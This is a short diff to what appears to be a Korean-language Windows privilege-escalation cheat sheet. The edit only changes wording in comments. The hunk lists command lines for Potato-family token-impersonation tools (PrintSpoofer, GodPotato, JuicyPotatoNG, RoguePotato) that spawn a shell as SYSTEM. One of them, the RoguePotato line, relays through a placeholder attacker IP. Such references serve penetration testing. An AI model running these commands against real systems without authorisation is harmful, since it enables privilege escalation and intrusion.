@@ -34,10 +34,10 @@ PrintSpoofer.exe -i -c cmd
 # GodPotato (최신 Windows 10/11 및 Server 2019/2022에서 동작)
 GodPotato.exe -cmd "cmd /c whoami"
 
-# JuicyPotatoNG (차세대 DCOM 기반 토큰 위장)
+# JuicyPotatoNG (차세대 DCOM 기반 token 위장)
 JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami"
 
-# RoguePotato (DCOM 원격 활성화를 이용한 토큰 위장, 특정 환경에서 JuicyPotato 대체재)
+# RoguePotato (DCOM 원격 활성화를 이용한 token 위장, 특정 환경에서 JuicyPotato 대체재)
 RoguePotato.exe -r <attacker_ip> -c "<clsid>" -e "cmd.exe"
 
 # PetitPotam (MS-EFSRPC를 이용한 강제 인증 유도 후 릴레이/위장에 활용)
